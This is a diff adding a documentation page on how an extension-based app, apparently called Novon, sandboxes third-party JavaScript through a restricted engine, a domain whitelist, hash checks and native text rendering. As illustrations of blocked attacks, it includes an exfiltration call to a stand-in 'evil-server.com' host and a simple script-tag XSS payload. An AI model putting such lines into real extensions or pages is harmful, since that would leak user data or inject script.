@@ -1,0 +1,47 @@
+---
+title: Sandboxing & Security
+description: How Novon prevents malicious extensions from harming your device.
+---
+
+Because Novon relies on executing third-party JavaScript (the `source.js` file of an extension), security is a primary concern. Unlike a standard web browser that relies on Chromium's massive security sandbox, Novon implements its own strict isolation model using a stripped-down JS engine.
+
+## 1. Minimal JavaScript Environment
+
+Extensions are executed inside `flutter_qjs` (QuickJS). 
+This environment is fundamentally restricted:
+
+- **No DOM:** The `window` and `document` objects do not exist. (Extensions must use Novon's injected `parseHtml()` helper to parse strings of HTML).
+- **No File System:** There is no `fs` module. The JS engine physically cannot read files on your device.
+- **No Storage:** `localStorage`, `sessionStorage`, and `indexedDB` are completely absent. Extensions cannot persist tracking cookies or data across sessions.
+
+## 2. Network Whitelisting
+
+A malicious extension might try to steal user data (or cryptomine) by making arbitrary network calls to a remote server.
+
+To prevent this, the `manifest.json` file requires an explicit `domains` array.
+
+```json
+{
+  "baseUrl": "https://mysource.com",
+  "domains": ["cdn.mysource.com", "images.mysource.com"]
+}
+```
+
+When the extension calls `http.get()`, Novon's Dart engine intercepts the call. It verifies the host of the requested URL against the manifest. 
+**If the extension attempts to contact an unlisted domain (e.g., `http.post("https://evil-server.com")`), the request is immediately aborted and throws a `SecurityException`.**
+
+## 3. Cryptographic Verification
+
+Extension repositories host `index.json` files which contain the SHA-256 hash of every `.novext` bundle.
+
+During installation:
+1. Novon downloads the ZIP file.
+2. Novon computes the SHA-256 hash locally.
+3. It compares the local hash to the hash in the `index.json`.
+4. If they do not match, the installation is aborted. This prevents Man-in-the-Middle attacks from substituting malicious code during the download.
+
+## 4. UI Sandboxing
+
+When reading a chapter, the text is rendered via Flutter's native Text widgets (or a highly sanitized `flutter_html` viewport). It is *never* rendered in a `WebView`. 
+
+This makes Cross-Site Scripting (XSS) impossible. If an extension attempts to return malicious `<script>alert('hack');</script>` tags inside `fetchChapterContent`, the Dart parser simply ignores or strips them.
